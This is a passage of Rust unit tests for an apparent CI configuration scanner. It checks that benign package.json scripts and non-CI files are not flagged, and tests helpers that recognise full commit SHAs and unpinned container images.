        let pkg = r#"{"name":"x","scripts":{"test":"jest","build":"webpack"}}"#;
        assert!(clean(pkg, "package.json"));
    }

    #[test]
    fn package_json_prepare_husky_clean() {
        // `prepare` is deliberately NOT an install-hook we flag (commonly a
        // benign `husky install`).
        let pkg = r#"{"name":"x","scripts":{"prepare":"husky install"}}"#;
        assert!(clean(pkg, "package.json"));
    }

    #[test]
    fn package_json_malformed_clean() {
        assert!(clean("{not json", "package.json"));
        assert!(clean("", "package.json"));
    }

    // --- non-CI file is a no-op ------------------------------------------

    #[test]
    fn non_ci_file_produces_nothing() {
        // The same dangerous-looking text in a non-CI file is this module's
        // no-op (other rule modules may still inspect it).
        assert!(clean("FROM ubuntu:latest", "notes.md"));
        assert!(clean("uses: actions/checkout@v4", "random.txt"));
    }

    // --- helper unit tests ------------------------------------------------

    #[test]
    fn is_commit_sha_only_accepts_full_hex() {
        assert!(is_commit_sha("8ade135a41bc03ea155e62e844d188df1ea18608"));
        assert!(!is_commit_sha("v4"));
        assert!(!is_commit_sha("8ade135")); // short SHA
        assert!(!is_commit_sha("main"));
        assert!(!is_commit_sha("ZZZZ135a41bc03ea155e62e844d188df1ea18608")); // non-hex
    }

    #[test]
    fn unpinned_image_reason_classifies() {
        assert!(unpinned_image_reason("ubuntu:latest").is_some());
        assert!(unpinned_image_reason("ubuntu").is_some());
        assert!(unpinned_image_reason("node:20.11.1").is_none());
        assert!(unpinned_image_reason(
            "ubuntu@sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
        )
        .is_none());
    }
}
